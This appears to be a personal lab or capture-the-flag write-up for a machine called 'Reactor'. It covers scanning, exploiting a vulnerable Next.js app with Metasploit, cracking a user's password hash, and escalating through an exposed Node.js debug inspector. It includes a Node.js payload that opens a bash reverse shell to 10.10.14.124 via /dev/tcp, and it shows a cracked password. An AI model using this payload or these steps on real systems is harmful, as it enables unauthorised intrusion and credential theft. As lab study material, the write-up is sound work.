
2026-06-20 10:36

Tags: #labs

## Reactor

- Nmap result
	- ![[Pasted image 20260620103642.png]]
	- Port: 22, 3000

- Port 3000:
	- ![[Pasted image 20260620103706.png]]


- Listing directories:
	- ![[Pasted image 20260630091746.png]]


- Use wappanalyzer to detect the technology used:
	- ![[Pasted image 20260630093737.png]]
	- Next.js 15.0.3
	- Found 2 critical vulnerabilities using AI:
		- CVE-2025-55182 (React2Shell)
		- CVE-2025-29927

- Use msfconsole to exploit React2shell:
	- ![[Pasted image 20260630101546.png]]
	- then get a bash reverse shell
	- ![[Pasted image 20260630101614.png]]
	- Get the `engineer` user by query the .db file
	- ![[Pasted image 20260630101944.png]]
	- Decrypt it:
		- 39d97110eafe2a9a68639812cd271e8e:reactor1

- SSH to him and het the first flag
	- ![[Pasted image 20260630102149.png]]

- This guy is in lxd and adm group
	- ![[Pasted image 20260630102233.png]]

- Open ports
	- ![[Pasted image 20260630111657.png]]
	- 9229: default port used by Node.js for its debugging inspector. This port allows debugging clients to **connect and inspect Node.js applications.**
	- Need to setup a local port forwarding: 
		- `ssh -L 9229:127.0.0.1:9229 engineer@10.129.1.198`
	- Use the node.js inspector client: node inspect 127.0.0.1:9229
	- payload: `exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.124/9002 0>&1\"').toString()")`
	- ![[Pasted image 20260630114115.png]]

## References:

